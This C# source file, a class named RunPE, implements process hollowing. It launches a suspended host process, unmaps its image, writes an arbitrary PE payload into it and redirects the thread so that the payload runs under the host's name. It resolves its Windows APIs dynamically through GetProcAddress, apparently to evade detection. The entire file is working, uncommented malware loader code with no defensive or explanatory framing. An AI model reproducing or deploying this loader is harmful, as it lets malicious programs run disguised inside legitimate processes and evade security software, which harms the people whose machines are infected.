using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class RunPE
{
	public static void Run(string path, byte[] payload)
	{
		for (int i = 0; i < 5; i++)
		{
			int bytesRead = 0;
			StartupInformation si = new StartupInformation
			{
				Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)))
			};
			ProcessInformation pi = new ProcessInformation();

			try
			{
				if (!CreateProcessA(path, "", IntPtr.Zero, IntPtr.Zero, false, 0x8000004, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();

				int fileAddress = BitConverter.ToInt32(payload, 0x3c);
				int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);

				int[] context = new int[0xb3];
				context[0] = 0x10002;

				if (IntPtr.Size == 4)
				{
					if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception();
				}
				else
				{
					if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception();
				}

				int ebx = context[0x29];
				int baseAddress = 0;
				if (!ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref bytesRead)) throw new Exception();
				if (imageBase == baseAddress && ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0) throw new Exception();

				int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
				int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
				int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
				if (newImageBase == 0) throw new Exception();

				if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref bytesRead)) throw new Exception();
				for (int j = 0, sectionOffset = fileAddress + 0xf8; j < BitConverter.ToInt16(payload, fileAddress + 6); j++)
				{
					int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xc);
					int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
					int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);

					if (sizeOfRawData != 0)
					{
						byte[] sectionData = new byte[sizeOfRawData];
						Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sectionData.Length);
						if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref bytesRead)) throw new Exception();
					}

					sectionOffset += 0x28;
				}
				if (!WriteProcessMemory(pi.ProcessHandle, ebx + 8, BitConverter.GetBytes(newImageBase), 4, ref bytesRead)) throw new Exception();
				context[0x2c] = newImageBase + BitConverter.ToInt32(payload, fileAddress + 0x28);

				if (IntPtr.Size == 4)
				{
					if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
				}
				else
				{
					if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
				}

				if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
			}
			catch
			{
				Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
				continue;
			}

			break;
		}
	}

	private delegate bool CreateProcessADelegate(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
	private delegate bool GetThreadContextDelegate(IntPtr thread, int[] context);
	private delegate bool Wow64GetThreadContextDelegate(IntPtr thread, int[] context);
	private delegate bool SetThreadContextDelegate(IntPtr thread, int[] context);
	private delegate bool Wow64SetThreadContextDelegate(IntPtr thread, int[] context);
	private delegate int ResumeThreadDelegate(IntPtr handle);
	private delegate int VirtualAllocExDelegate(IntPtr handle, int address, int length, int type, int protect);
	private delegate bool WriteProcessMemoryDelegate(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
	private delegate bool ReadProcessMemoryDelegate(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
	private delegate int ZwUnmapViewOfSectionDelegate(IntPtr process, int baseAddress);

	private static readonly CreateProcessADelegate CreateProcessA = LoadApi<CreateProcessADelegate>("kernel32.dll", "CreateProcessA");
	private static readonly GetThreadContextDelegate GetThreadContext = LoadApi<GetThreadContextDelegate>("kernel32.dll", "GetThreadContext");
	private static readonly Wow64GetThreadContextDelegate Wow64GetThreadContext = LoadApi<Wow64GetThreadContextDelegate>("kernel32.dll", "Wow64GetThreadContext");
	private static readonly SetThreadContextDelegate SetThreadContext = LoadApi<SetThreadContextDelegate>("kernel32.dll", "SetThreadContext");
	private static readonly Wow64SetThreadContextDelegate Wow64SetThreadContext = LoadApi<Wow64SetThreadContextDelegate>("kernel32.dll", "Wow64SetThreadContext");
	private static readonly ResumeThreadDelegate ResumeThread = LoadApi<ResumeThreadDelegate>("kernel32.dll", "ResumeThread");
	private static readonly VirtualAllocExDelegate VirtualAllocEx = LoadApi<VirtualAllocExDelegate>("kernel32.dll", "VirtualAllocEx");
	private static readonly WriteProcessMemoryDelegate WriteProcessMemory = LoadApi<WriteProcessMemoryDelegate>("kernel32.dll", "WriteProcessMemory");
	private static readonly ReadProcessMemoryDelegate ReadProcessMemory = LoadApi<ReadProcessMemoryDelegate>("kernel32.dll", "ReadProcessMemory");
	private static readonly ZwUnmapViewOfSectionDelegate ZwUnmapViewOfSection = LoadApi<ZwUnmapViewOfSectionDelegate>("ntdll.dll", "ZwUnmapViewOfSection");

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);
	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);
	private static TDelegate LoadApi<TDelegate>(string name, string method) where TDelegate : Delegate
	{
		return (TDelegate)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(TDelegate));
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct ProcessInformation
	{
		public readonly IntPtr ProcessHandle;
		public readonly IntPtr ThreadHandle;
		public readonly uint ProcessId;
		private readonly uint ThreadId;
	}
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct StartupInformation
	{
		public uint Size;
		private readonly string Reserved1;
		private readonly string Desktop;
		private readonly string Title;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)]
		private readonly byte[] Misc;
		private readonly IntPtr Reserved2;
		private readonly IntPtr StdInput;
		private readonly IntPtr StdOutput;
		private readonly IntPtr StdError;
	}
}